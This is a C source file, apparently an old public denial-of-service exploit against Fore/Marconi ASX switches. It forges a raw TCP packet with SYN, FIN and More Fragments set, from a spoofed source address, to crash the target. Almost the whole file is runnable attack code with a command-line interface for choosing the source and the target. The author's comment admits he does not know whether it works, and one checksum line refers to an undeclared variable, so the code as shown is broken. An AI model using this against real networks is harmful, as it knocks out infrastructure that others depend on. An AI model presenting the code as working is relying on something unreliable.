/*
This DoS attack was discovered by Keith Pachulski and written by J.K. Garvey. This simple program sets the SYN, FIN and More Fragment bits and sends this crafted packet from a spoofed host to a destined Fore/Marconi ASX switch, which causes it to crash. I have no idea if this works, but it does what Keith Pachulski described. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define IP_MF 0x2000		/* More fragment bits */

void                forge (unsigned int, unsigned int, unsigned short); 
unsigned short      in_cksum (unsigned short *, int);
unsigned int        host_convert (char *);
void                usage (char *);

main (int argc, char **argv)
{
	unsigned int        source_host = 0, dest_host = 0;
	unsigned short      source_port = 0, dest_port = 80;
	int                 input;
	char                desthost[16], srchost[16];

	printf ("\nDenial of Service attack for Fore/Marconi ASX Switches\n");
	printf
		("Found by Keith Pachulski <keithp@corp.ptd.net>\nExploit written by J.K. Garvey <jim@trig.org>\n");

	if (getuid () != 0)
	{
		printf
			("\nRoot is required. Duh.\n");
		exit (0);
	}

	if (argc < 5)
	{
		usage (argv[0]);
		exit (0);
	}

        while ((input = getopt (argc, argv, "s:d:p:")) != -1)
	{
		switch (input)
		{
			case 's':
				source_host = host_convert (optarg);
				strncpy (srchost, optarg, 16);
			break;

			case 'd':
				dest_host = host_convert (optarg);
				strncpy (desthost, optarg, 16);
			break;

			case 'p':
				dest_port = atoi(optarg);
			break;
		}
	}

	forge (source_host, dest_host, dest_port); 
	printf ("\nCrafted packet sent!\n");

	exit (0);
}

void
forge (unsigned int source_addr, unsigned int dest_addr, unsigned short dest_port) 
{
	struct send
	{
		struct iphdr        ip;
		struct tcphdr       tcp;
	}
	send;

	/* From synhose.c by knight */
	struct pseudo_header
	{
		unsigned int        source_address;
		unsigned int        dest_address;
		unsigned char       placeholder;
		unsigned char       protocol;
		unsigned short      tcp_length;
		struct tcphdr       tcp;
	}
	pseudo_header;

	int                 ch;
	int                 send_socket;
	int                 recv_socket;
	struct sockaddr_in  sin;
	char               *input;

	srand ((getpid ()) * (dest_port));

	/* Begin forged IP header */
	send.ip.ihl = 5;
	send.ip.version = 4;
	send.ip.tos = 0;
	send.ip.tot_len = htons (40);
	send.ip.id = (int) (255.0 * rand () / (RAND_MAX + 1.0));

	/* Note more fragments bit has been set */
	send.ip.frag_off = htons (IP_MF);

	send.ip.ttl = 64;
	send.ip.protocol = IPPROTO_TCP;
	send.ip.check = 0;
	send.ip.saddr = source_addr;
	send.ip.daddr = dest_addr;

	/* Begin forged TCP header */
	send.tcp.source = 1 + (int) (25.0 * rand () / (RAND_MAX + 1.0));
	send.tcp.seq = 1 + (int) (10000.0 * rand () / (RAND_MAX + 1.0));

	send.tcp.dest = htons (dest_port);
	send.tcp.ack_seq = 0;
	send.tcp.res1 = 0;
	send.tcp.doff = 5;

	/* Note FIN and SYN flags are set */
	send.tcp.fin = 1;
	send.tcp.syn = 1;

	send.tcp.rst = 0;
	send.tcp.psh = 0;
	send.tcp.ack = 0;
	send.tcp.urg = 0;
	send.tcp.window = htons (512);
	send.tcp.check = 0;
	send.tcp.urg_ptr = 0;

	/* Drop our forged data into the socket struct */
	sin.sin_family = AF_INET;
	sin.sin_port = send.tcp.source;
	sin.sin_addr.s_addr = send.ip.daddr;

	/* Now open the raw socket for sending */
	send_socket = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (send_socket < 0)
	{
		perror ("Send socket cannot be opened.");
		exit (1);
	}

	/* Make IP header checksum */
	send.ip.check = in_cksum ((unsigned short *) &send_tcp.ip, 20);

	/* Final preparation of the full header */

	/* From synhose.c by knight */
	pseudo_header.source_address = send.ip.saddr;
	pseudo_header.dest_address = send.ip.daddr;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons (20);

	bcopy ((char *) &send.tcp, (char *) &pseudo_header.tcp, 20);
	/* Final checksum on the entire package */
	send.tcp.check = in_cksum ((unsigned short *) &pseudo_header, 32);
	/* Away we go.... */
	sendto (send_socket, &send, 40, 0,
		(struct sockaddr *) &sin, sizeof (sin));
	close (send_socket);
}

unsigned short
in_cksum (unsigned short *ptr, int nbytes)
{
	register long       sum;	/* assumes long == 32 bits */
	u_short             oddbyte;
	register u_short    answer;	/* assumes u_short == 16 bits */

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}

	if (nbytes == 1)
	{
		oddbyte = 0;	/* make sure top half is zero */
		*((u_char *) & oddbyte) = *(u_char *) ptr; /* one byte only */
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
	sum += (sum >> 16);	/* add carry */
	answer = ~sum;		/* ones-complement, then truncate to 16 bits */
	return (answer);
}

unsigned int
host_convert (char *hostname)
{
	static struct in_addr i;
	struct hostent     *h;

	i.s_addr = inet_addr (hostname);
	if (i.s_addr == -1)
	{
		h = gethostbyname (hostname);
		if (h == NULL)
		{
			fprintf (stderr, "cannot resolve %s\n", hostname);
			exit (0);
		}
		bcopy (h->h_addr, (char *) &i.s_addr, h->h_length);
	}
	return i.s_addr;
}

void
usage (char *progname)
{
	printf ("\nusage: %s -s source_host -d destination_host -p destination_port (default is 80)\n\n",
		progname);
}

